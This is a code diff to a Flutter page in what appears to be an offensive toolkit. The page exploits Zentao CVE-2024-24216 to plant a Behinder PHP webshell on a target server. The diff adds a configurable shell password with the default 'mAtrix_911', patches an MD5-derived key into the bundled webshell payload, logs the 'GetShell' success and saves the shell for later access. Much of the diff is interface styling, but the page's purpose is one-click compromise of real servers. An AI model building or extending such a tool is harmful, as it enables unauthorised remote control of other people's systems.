@@ -1,5 +1,8 @@
+import 'dart:convert';
+
+import 'package:crypto/crypto.dart';
 import 'package:flutter/material.dart';
-import 'package:flutter/services.dart' show rootBundle;
+import 'package:flutter/services.dart' show rootBundle, Clipboard, ClipboardData;
 
 import '../database/database_helper.dart';
 import '../exp/zentao/zentao_exp_service.dart';
@@ -28,15 +31,83 @@ class ZentaoExpPage extends StatelessWidget {
             const Icon(Icons.storage, color: AppColors.primary),
             const SizedBox(width: 8),
             Text(
-              'Zentao 仓库 RCE · GetShell',
+              'Zentao CVE-2024-24216 · GetShell',
               style: AppTextStyles.heading(size: 14, color: AppColors.primary),
             ),
           ],
         ),
       ),
-      body: const Padding(
-        padding: EdgeInsets.all(24),
-        child: _ZentaoExpCard(),
+      body: Padding(
+        padding: const EdgeInsets.all(24),
+        child: Column(
+          crossAxisAlignment: CrossAxisAlignment.stretch,
+          children: [
+            Container(
+              padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
+              decoration: BoxDecoration(
+                color: AppColors.bgCard,
+                borderRadius: BorderRadius.circular(10),
+                border: Border.all(color: AppColors.border),
+                boxShadow: [
+                  BoxShadow(
+                    color: AppColors.primary.withValues(alpha: 0.06),
+                    blurRadius: 12,
+                    offset: const Offset(0, 2),
+                  ),
+                ],
+              ),
+              child: Row(
+                children: [
+                  Container(
+                    width: 44,
+                    height: 44,
+                    decoration: BoxDecoration(
+                      gradient: LinearGradient(
+                        begin: Alignment.topLeft,
+                        end: Alignment.bottomRight,
+                        colors: [
+                          AppColors.primary.withValues(alpha: 0.2),
+                          AppColors.primary.withValues(alpha: 0.08),
+                        ],
+                      ),
+                      borderRadius: BorderRadius.circular(10),
+                      border: Border.all(
+                        color: AppColors.primary.withValues(alpha: 0.4),
+                        width: 1,
+                      ),
+                    ),
+                    child: const Icon(Icons.storage, color: AppColors.primary, size: 22),
+                  ),
+                  const SizedBox(width: 16),
+                  Expanded(
+                    child: Column(
+                      crossAxisAlignment: CrossAxisAlignment.start,
+                      children: [
+                        Text(
+                          'Zentao CVE-2024-24216 · GetShell',
+                          style: AppTextStyles.heading(
+                            size: 14,
+                            color: AppColors.textPrimary,
+                          ),
+                        ),
+                        const SizedBox(height: 4),
+                        Text(
+                          '利用禅道 Repo 配置写入冰蝎 WebShell，一键 GetShell',
+                          style: AppTextStyles.caption(
+                            size: 12,
+                            color: AppColors.textSecondary,
+                          ),
+                        ),
+                      ],
+                    ),
+                  ),
+                ],
+              ),
+            ),
+            const SizedBox(height: 16),
+            const Expanded(child: _ZentaoExpCard()),
+          ],
+        ),
       ),
     );
   }
@@ -52,6 +123,7 @@ class _ZentaoExpCard extends StatefulWidget {
 class _ZentaoExpCardState extends State<_ZentaoExpCard> {
   final _urlController = TextEditingController();
   final _timeoutController = TextEditingController(text: '10');
+  final _passwordController = TextEditingController(text: 'mAtrix_911');
   final _logScrollController = ScrollController();
 
   String _log = '';
@@ -87,8 +159,11 @@ class _ZentaoExpCardState extends State<_ZentaoExpCard> {
     setState(() => _running = true);
     _appendLog('[*] 尝试利用禅道 Repo 配置写入冰蝎 WebShell...');
     try {
-      final shellContent = await rootBundle
+      final password = _passwordController.text.trim().isEmpty ? 'mAtrix_911' : _passwordController.text.trim();
+      var shellContent = await rootBundle
           .loadString('assets/defaults/payloads/php_behinder.php');
+      final key = md5.convert(utf8.encode(password)).toString().substring(0, 16);
+      shellContent = shellContent.replaceFirst(RegExp(r'\$key="[0-9a-f]{16}"'), '\$key="$key"');
       final svc = ZentaoExpService(
         url: url,
         timeout: Duration(
@@ -101,8 +176,8 @@ class _ZentaoExpCardState extends State<_ZentaoExpCard> {
         onLog: _appendLog,
       );
       if (shellUrl != null) {
-        _appendLog('[+] GetShell 成功: $shellUrl (Pass: mAtrix_911)');
-        if (mounted) await _openWebshellFromResult(context, shellUrl);
+        _appendLog('[+] GetShell 成功: $shellUrl (Pass: $password)');
+        if (mounted) await _openWebshellFromResult(context, shellUrl, password);
       } else {
         _appendLog('[-] GetShell 失败，请检查目标版本与访问路径');
       }
@@ -114,14 +189,14 @@ class _ZentaoExpCardState extends State<_ZentaoExpCard> {
   }
 
   Future<void> _openWebshellFromResult(
-      BuildContext context, String shellUrl) async {
+      BuildContext context, String shellUrl, String password) async {
     final now = DateTime.now();
     Webshell ws = Webshell(
       id: 0,
       projectId: 0,
       name: 'Zentao Repo WebShell',
       url: shellUrl,
-      password: 'mAtrix_911',
+      password: password,
       type: 'php',
       method: 'POST',
       status: 1,
@@ -137,7 +212,7 @@ class _ZentaoExpCardState extends State<_ZentaoExpCard> {
           project.id,
           name: 'Zentao Repo WebShell',
           url: shellUrl,
-          password: 'mAtrix_911',
+          password: password,
           method: 'POST',
           type: 'php',
           connectorType: 'php_behinder',
@@ -263,8 +338,36 @@ class _ZentaoExpCardState extends State<_ZentaoExpCard> {
   void dispose() {
     _urlController.dispose();
     _timeoutController.dispose();
+    _passwordController.dispose();
     _logScrollController.dispose();
     super.dispose();
+  }
+
+  Color _logLineColor(String line) {
+    if (line.startsWith('[+]')) return AppColors.primary;
+    if (line.startsWith('[!]')) return AppColors.red;
+    if (line.startsWith('[-]')) return AppColors.textMuted;
+    if (line.startsWith('[*]')) return AppColors.cyan;
+    if (line.startsWith('[i]')) return AppColors.cyan.withValues(alpha: 0.9);
+    return AppColors.textSecondary;
+  }
+
+  TextSpan _buildLogRichText(String log) {
+    if (log.isEmpty) {
+      return TextSpan(text: '> 等待操作', style: TextStyle(color: AppColors.textMuted, fontFamily: 'Monaco'));
+    }
+    final lines = log.split('\n');
+    final spans = <TextSpan>[];
+    final baseStyle = AppTextStyles.terminal(size: 12, color: AppColors.textSecondary);
+    for (var i = 0; i < lines.length; i++) {
+      final line = lines[i];
+      final color = _logLineColor(line);
+      spans.add(TextSpan(
+        text: line + (i < lines.length - 1 ? '\n' : ''),
+        style: baseStyle.copyWith(color: color, fontWeight: line.startsWith('[+]') || line.startsWith('[!]') ? FontWeight.w600 : null),
+      ));
+    }
+    return TextSpan(children: spans);
   }
 
   @override
@@ -292,7 +395,7 @@ class _ZentaoExpCardState extends State<_ZentaoExpCard> {
               ),
               const SizedBox(width: 10),
               Text(
-                'Zentao 仓库 RCE · GetShell',
+                'Zentao CVE-2024-24216 · GetShell',
                 style: AppTextStyles.heading(
                     size: 14, color: AppColors.textPrimary),
               ),
@@ -328,6 +431,14 @@ class _ZentaoExpCardState extends State<_ZentaoExpCard> {
                           decoration:
                               _inputDecoration('超时(s)', '10'),
                           keyboardType: TextInputType.number,
+                        ),
+                        const SizedBox(height: 8),
+                        TextField(
+                          controller: _passwordController,
+                          style: AppTextStyles.body(
+                              size: 12, color: AppColors.textPrimary),
+                          decoration:
+                              _inputDecoration('GetShell 密码', 'mAtrix_911'),
                         ),
                         const SizedBox(height: 16),
                         _sectionTitle('利用动作'),
@@ -372,6 +483,31 @@ class _ZentaoExpCardState extends State<_ZentaoExpCard> {
                                     : AppColors.textSecondary,
                               ),
                             ),
+                            const Spacer(),
+                            TextButton.icon(
+                              onPressed: _log.isEmpty ? null : () async {
+                                await Clipboard.setData(ClipboardData(text: _log));
+                                if (!mounted) return;
+                                ScaffoldMessenger.of(context).showSnackBar(
+                                  const SnackBar(content: Text('已复制到剪贴板'), duration: Duration(seconds: 1)),
+                                );
+                              },
+                              icon: const Icon(Icons.copy, size: 14),
+                              label: const Text('复制'),
+                              style: TextButton.styleFrom(
+                                foregroundColor: AppColors.textSecondary,
+                                textStyle: const TextStyle(fontSize: 11),
+                              ),
+                            ),
+                            TextButton.icon(
+                              onPressed: _log.isEmpty ? null : () => setState(() => _log = ''),
+                              icon: const Icon(Icons.clear_all, size: 14),
+                              label: const Text('清空'),
+                              style: TextButton.styleFrom(
+                                foregroundColor: AppColors.textSecondary,
+                                textStyle: const TextStyle(fontSize: 11),
+                              ),
+                            ),
                           ],
                         ),
                         const Divider(
@@ -380,10 +516,9 @@ class _ZentaoExpCardState extends State<_ZentaoExpCard> {
                         Expanded(
                           child: SingleChildScrollView(
                             controller: _logScrollController,
-                            child: SelectableText(
-                              _log.isEmpty ? '> 等待操作' : _log,
-                              style: AppTextStyles.terminal(
-                                  size: 12, color: AppColors.textMuted),
+                            child: SelectableText.rich(
+                              _buildLogRichText(_log),
+                              style: AppTextStyles.terminal(size: 12, color: AppColors.textMuted),
                             ),
                           ),
                         ),
